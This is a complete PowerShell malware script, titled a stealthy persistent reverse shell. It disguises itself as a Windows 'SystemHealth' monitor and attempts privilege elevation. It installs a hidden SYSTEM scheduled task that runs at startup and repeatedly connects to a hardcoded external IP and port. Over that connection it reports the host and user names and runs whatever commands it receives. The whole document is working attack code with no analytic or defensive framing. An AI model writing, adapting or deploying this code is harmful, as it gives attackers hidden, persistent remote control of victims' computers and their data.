# Stealthy Persistent Reverse Shell with Auto-Installation
# Connection Parameters
$IP = "147.185.221.31"
$Port = 47034
$MaxRetries = 1000
$RetryDelay = 10  # seconds

# Installation Paths
$InstallDir = "$env:ProgramData\Microsoft\Windows\SystemHealth"
$InstallPath = "$InstallDir\system_health.ps1"
$TaskName = "SystemHealthMonitor"

function Install-Persistence {
    # Create installation directory if it doesn't exist
    if (-not (Test-Path $InstallDir)) {
        try {
            New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
        } catch {
            return $false
        }
    }
    
    # Check if already installed
    if (Test-Path $InstallPath) {
        return $true
    }
    
    # Check for admin privileges
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    
    if (-not $isAdmin) {
        # Attempt to elevate privileges
        try {
            $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
            
            $process = Start-Process PowerShell.exe -ArgumentList "-EncodedCommand $encodedCommand" -Verb RunAs -PassThru -WindowStyle Hidden
            if ($process.Id) {
                Start-Sleep -Seconds 3
                exit 0
            }
        } catch {
            return $false
        }
    }
    
    # Copy self to installation path
    try {
        $selfContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
        Set-Content -Path $InstallPath -Value $selfContent -Force
    } catch {
        return $false
    }
    
    # Create scheduled task for persistence
    try {
        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -WakeToRun -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        # Register the task
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Invoke-StealthShell {
    param($IP, $Port, $MaxRetries, $RetryDelay)
    
    $RetryCount = 0
    while ($RetryCount -lt $MaxRetries) {
        try {
            # Create TCP client with timeout
            $Client = New-Object System.Net.Sockets.TCPClient
            $Connection = $Client.BeginConnect($IP, $Port, $null, $null)
            $ConnectionSuccess = $Connection.AsyncWaitHandle.WaitOne(5000, $true)
            
            if (!$ConnectionSuccess) {
                throw "Connection timeout"
            }
            
            $Client.EndConnect($Connection)
            $Stream = $Client.GetStream()
            
            # Send initial beacon
            $WelcomeMsg = "[+] Connected from $env:COMPUTERNAME as $env:USERNAME`n"
            $WelcomeBytes = [System.Text.Encoding]::ASCII.GetBytes($WelcomeMsg)
            $Stream.Write($WelcomeBytes, 0, $WelcomeBytes.Length)
            $Stream.Flush()
            
            # Data buffer
            [byte[]]$Bytes = 0..65535 | %{0}
            
            # Main communication loop
            while (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
                $Command = [System.Text.Encoding]::ASCII.GetString($Bytes, 0, $i)
                
                # Execute command and capture output
                try {
                    $Output = (Invoke-Expression -Command $Command 2>&1 | Out-String)
                } catch {
                    $Output = $_.Exception.Message + "`n"
                }
                
                # Send output back
                $ResponseBytes = ([text.encoding]::ASCII).GetBytes($Output)
                $Stream.Write($ResponseBytes, 0, $ResponseBytes.Length)
                $Stream.Flush()
            }
            
            $Client.Close()
        } catch {
            # Silent error handling
        }
        
        $RetryCount++
        Start-Sleep -Seconds $RetryDelay
    }
}

# Main execution block
try {
    # Stealth Configuration - Hide window and suppress output
    $WindowStyle = "Hidden"
    if ($WindowStyle -eq "Hidden") {
        try {
            $null = [System.Console]::SetOut([System.IO.TextWriter]::Null)
        } catch {}
    }
    
    # Check if we're running from installation path
    $isInstalled = ($MyInvocation.MyCommand.Path -eq $InstallPath)
    
    # Install persistence if not already installed
    if (-not $isInstalled) {
        $installed = Install-Persistence
        if ($installed) {
            # If we just installed, launch detached process and exit
            if (Test-Path $InstallPath) {
                # Start completely detached process that survives PowerShell closure
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "PowerShell.exe"
                $psi.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallPath`""
                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
                $psi.CreateNoWindow = $true
                $psi.UseShellExecute = $false
                
                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $psi
                $process.Start() | Out-Null
                
                # Immediately detach from parent process
                $process.Dispose()
                exit 0
            }
        }
    }
    
    # If we reach here, we're running from the installed location
    # Execution Guard - Ensure single instance
    $MutexName = "Global\RustCatShellMutex"
    try {
        $Mutex = New-Object System.Threading.Mutex($false, $MutexName)
        $HasMutex = $Mutex.WaitOne(0, $false)
    } catch {
        $HasMutex = $false
    }
    
    if ($HasMutex) {
        # Launch the shell - this runs in the background independently
        Invoke-StealthShell -IP $IP -Port $Port -MaxRetries $MaxRetries -RetryDelay $RetryDelay
    } else {
        exit 0
    }
} catch {
    exit 0
}
